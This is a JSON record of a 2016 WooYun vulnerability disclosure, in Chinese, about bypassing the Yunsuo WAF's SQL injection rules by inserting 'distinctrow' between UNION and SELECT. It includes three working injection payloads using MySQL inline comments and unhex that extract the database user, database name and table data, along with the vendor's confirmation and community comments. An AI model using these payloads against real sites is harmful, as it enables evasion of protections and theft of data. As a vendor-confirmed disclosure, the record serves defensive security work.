{"id": 86808, "wybug_id": "wooyun-2016-0176190", "wybug_title": "完美Bypass云锁最新版(V1.6.153)SQL注入防护规则(可UNION)", "wybug_corp": "云锁", "wybug_author": "从容", "wybug_date": "2016-02-17 10:44", "wybug_open_date": "2016-05-17 12:40", "wybug_type": "非授权访问/认证绕过", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["设计缺陷"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2016-02-17：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2016-02-17：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2016-02-20：\t细节向第三方安全合作伙伴开放（绿盟科技、唐朝安全巡航、无声信息）\t\t\t\t\t\t\t\t\t2016-04-12：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-04-22：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-05-02：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-05-17：\t细节向公众公开  简要描述： 完美Bypass云锁最新版(V1.6.153)SQL注入防护规则(可UNION) 详细说明：  云锁版本：\n\n\n\nMysql UNION语法\nhttp://**.**.**.**/doc/refman/5.5/en/union.htmlSELECT ... UNION [ALL | DISTINCT] SELECT ... [UNION [ALL | DISTINCT] SELECT ...]\n上回提到了这个union all\nhttp://**.**.**.**/bugs/wooyun-2016-0170481\n云锁在过滤危险请求的时候两个敏感字段相邻就会被干掉，但是两个敏感字段中间\"插入\"点什么的话就不会被匹配到。 distinct虽然没提到distinctrow但是也可以。   漏洞证明：  服务端Windows Server2003 + php + Apache + mysql客户端Windows7开启网站防御\n\n被拦截\n\n\n1' union distinctrow select/*!USER*/(),/*!DATABASE*/()#\n\n\n\n' union distinctrow select unhex('352E352E34322D6C6F67'),unhex('726F6F74406C6F63616C686F7374')#\n\n\n\nFROM1' union distinctrow select/*!USER*/(),/*!DATABASE*/()/*f*//*r*//*o*//*m*/users#\n\n\n   修复方案：  过滤。   版权声明：转载请注明来源 从容@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2016-02-17 12:39 厂商回复： 感谢帮我们指出此问题，此问题将在下个版本中修复。 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n     2016-02-17 10:45 |    \t\t奈何彼岸 \t\t\t( 普通白帽子  |\t\t\t        Rank:140 漏洞数:49        | 乌云一下你就知道)\t\t \n  沙发    \n     2016-02-17 10:52 |    \t\t坏男孩-A_A \t\t\t( 实习白帽子  |\t\t\t        Rank:81 漏洞数:23        | 膜拜学习中)\t\t \n  666    \n     2016-02-17 11:55 |    \t\t%230CC \t\t\t( 路人 |\t\t\t        Rank:6 漏洞数:2        | 溜溜)\t\t \n  Bypass 小能手    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}